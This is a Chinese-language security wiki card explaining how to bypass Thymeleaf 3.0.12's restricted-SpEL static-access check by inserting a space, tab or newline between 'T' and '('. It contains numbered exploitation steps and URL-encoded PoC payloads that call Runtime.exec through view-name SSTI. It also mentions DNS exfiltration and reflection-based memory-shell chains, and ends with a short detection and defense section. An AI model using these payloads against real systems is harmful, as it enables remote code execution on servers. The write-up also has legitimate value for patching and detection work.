---
id: web-java-expression-spel-thymeleaf-312-typestatic-whitespace-bypass
title: Thymeleaf 3.0.12 受限 SpEL 的 T( 静态访问检测绕过：T 与 ( 之间插入空格/换行/制表符
type: scenario
domain: web
path: web/java/expression/spel
technique: thymeleaf-typestatic-check-whitespace-bypass
tags:
- ssti
- thymeleaf
- spel
- restricted-mode
- filter-bypass
- whitespace
- static-access
- rce
cve: []
severity: high
confidence: high
status: verified
affected_versions: Thymeleaf 3.0.12.RELEASE（thymeleaf-spring5 3.0.12.RELEASE 的受限表达式上下文）
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V278
  verified_at: '2026-11-08T01:04:56+08:00'
  notes: 已对照原文与 img/33-38、39-40 核对：SPELVariableExpressionEvaluator.getExpression 在 restrictInstantiationAndStatic=true 时调用 containsSpELInstantiationOrStatic；该函数从后向前扫描，遇 ( 且前一字符紧邻 T、且 T 左侧为边界时 return true（img/37/38）；SpEL 允许 T 与 ( 间空白，T%20(/T%0a(/T%09( 均绕过，img/39/40 两种分号 URL 载荷弹计算器。卡内检测实现、PoC、版本(3.0.12)与原文一致；与视图名分号卡为两道独立检查的独立绕过，未合并。未复跑靶场。dedup 候选反射链/#strings 读文件为 T() 不可用时的替代链，非同链。
url: /docs/web/java/expression/spel/web-java-expression-spel-thymeleaf-312-typestatic-whitespace-bypass/
draft: false
kb_aliases:
- T ( 绕过
- T%0a( 绕过
- containsSpELInstantiationOrStatic 绕过
- SpEL T() 检测绕过
- Thymeleaf 3.0.12 T 过滤绕过
- 空白字符绕过静态类检测
---

## 一句话结论

Thymeleaf 3.0.12 在受限表达式执行前用 `SpringStandardExpressionUtils.containsSpELInstantiationOrStatic` 从后向前扫描，遇到 `(` 且其前一个字符紧邻 `T` 就判定为静态类访问并拒绝；在 `T` 与 `(` 之间插入空格、换行或制表符（`T (`、`T%0a(`、`T%09(`），SpEL 仍会把 `T (java.lang.Runtime)` 解析为类型引用，但检测因字符不再相邻而失效，从而在 `__${...}__` 预处理等受限场景恢复 `T()` 静态访问与命令执行。

## 原理

- **受限执行上下文**：Thymeleaf 对视图名/fragment 中的 `__${...}__` 预处理会调用 `StandardExpressionPreprocessor.preprocess`，内部以 `StandardExpressionExecutionContext.RESTRICTED` 执行表达式；`SPELVariableExpressionEvaluator.getExpression` 在该上下文下检查 `expContext.getRestrictInstantiationAndStatic()`，为真则调用 `SpringStandardExpressionUtils.containsSpELInstantiationOrStatic(spelExpression)`，命中即抛 `TemplateProcessingException("Instantiation of new objects and access to static classes is forbidden...")`。
- **检测实现**（3.0.12）：
  ```java
  int si = -1;
  while (n-- != 0) {
      char c = expression.charAt(n);
      ...
      if (c == ')') si = n;
      else {
          if (si > n && c == '(' && n - 1 >= 0 && expression.charAt(n - 1) == 'T'
              && (n - 1 == 0 || !Character.isJavaIdentifierPart(expression.charAt(n - 2))))
              return true;
          ...
      }
  }
  ```
  它要求 `(` 的**前一个字符**就是 `T`（且 `T` 左侧是边界），是对“`T(` 相邻字符”的字面匹配；`new` 关键字同样按字符序列 `n-e-w` 反向匹配。
- **SpEL 语法允许空白**：`T (java.lang.Runtime)` 与 `T(java.lang.Runtime)` 等价，因为词法分析会跳过 `T` 与 `(` 之间的空白字符（空格、`\t`、`\n`、`\r` 等）。检测器只做 `charAt(n-1) == 'T'`，一旦中间插入空白即不再命中。
- **与视图名校验的配合**：`checkViewNameNotInRequest` 用的 `StringUtils.pack` 会删除空白并转小写，因此空白只影响 SpEL 表达式本身，不影响第一道视图名/URI 子串比较；两条绕过可以串联（见关联卡）。

## 触发条件

- 使用 Thymeleaf 3.0.12（或包含相同 `containsSpELInstantiationOrStatic` 逻辑的版本）且存在受限上下文求值路径：
  - 视图名 `__${...}__::x` 预处理；
  - 片段表达式、模板内 `__${...}__` 预处理等由 `StandardExpressionPreprocessor` 执行的表达式。
- 用户可控制进入 `__${...}__` 的表达式文本。
- 目标使用 SpringEL（Spring 集成），且没有额外的 AST 级白名单/沙箱。

## 利用步骤

1. 确认目标的 Thymeleaf 版本为 3.0.12，并确认 `__${表达式}__` 会被预处理执行。
2. 先发朴素载荷验证被拦：
   ```text
   __${T(java.lang.Runtime).getRuntime().exec("calc")}__
   ```
   预期抛 `Instantiation of new objects and access to static classes is forbidden`。
3. 在 `T` 与 `(` 之间插入一个空白字符，构造：
   ```text
   __${T (java.lang.Runtime).getRuntime().exec("calc")}__
   ```
   URL 编码后也可写成 `T%20(`、`T%0a(`、`T%09(`。
4. 将表达式放入实际注入点（如问题卡中的 `/doc;/__...__::.x` 视图名），观察命令执行。
5. 无回显时改用 SpEL 写文件/读取响应流/DNS 外带，或结合 `#response` 等上下文对象回显。

## PoC

```text
/doc;/__${T (java.lang.Runtime).getRuntime().exec("calc")}__::.x
```

URL 编码变体（空格/换行/制表符）：

```text
/doc;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__::.x
/doc;/__$%7BT%0a(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__::.x
/doc;/__$%7BT%09(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__::.x
```

在模板/片段表达式上下文中的最小形式：

```text
__${T (java.lang.Runtime).getRuntime().exec("calc")}__
```

## 变体与关联

- 变体：任何 SpEL 词法允许的空白或不可见字符（空格、`\t`、`\n`、`\r`、`\f`、`\u000B` 等）都可尝试；核心是破坏 `T` 与 `(` 的相邻关系。
- 变体：若 `T(` 被完全按 AST/语法拦截，可改用反射链：`''.getClass().forName(...)`、`getMethods()`、`invoke`（见 [[web-java-expression-spel-restricted-reflection-memshell]]）。
- 关联：[[web-java-expression-spel-thymeleaf-312-viewname-check-semicolon-bypass]] 是同一文章中的第一道检查绕过（URI 分号 vs cached path），两者串联才能在 Thymeleaf 3.0.12 的路径派生视图名场景完成 RCE。
- 关联：[[web-java-expression-spel-thymeleaf-viewname-preprocessing-ssti]] 为 3.0.12 之前的基线入口；[[web-java-expression-spel-ruoyi-thymeleaf-fragment-ssti]] 的 `$${}` 绕过针对另一个函数 `SpringRequestUtils#containsExpression`。

## 检测与防御

- 修复：升级到包含后续修复的 Thymeleaf/thymeleaf-spring 版本；不要依赖字符相邻的字符串扫描来判断静态访问。
- 检测：在 `containsSpELInstantiationOrStatic` 前先做空白归一化（删除所有空白字符）再匹配 `T(`/`new`；更稳妥的是使用 SpEL AST 遍历，检查 `TypeReference`/`ConstructorReference` 节点而非原始字符串。
- 运行加固：受限上下文只暴露允许的变量与函数；彻底禁用 `T()` 与 `new`（自定义 `StandardEvaluationContext` 或 AST 校验）；模板目录只读。
- WAF/监控：请求中出现 `T%20(`、`T%0a(`、`T%09(`、`__${`、`::` 组合时告警；关注 Thymeleaf `Instantiation of new objects and access to static classes is forbidden` 异常前后的请求。
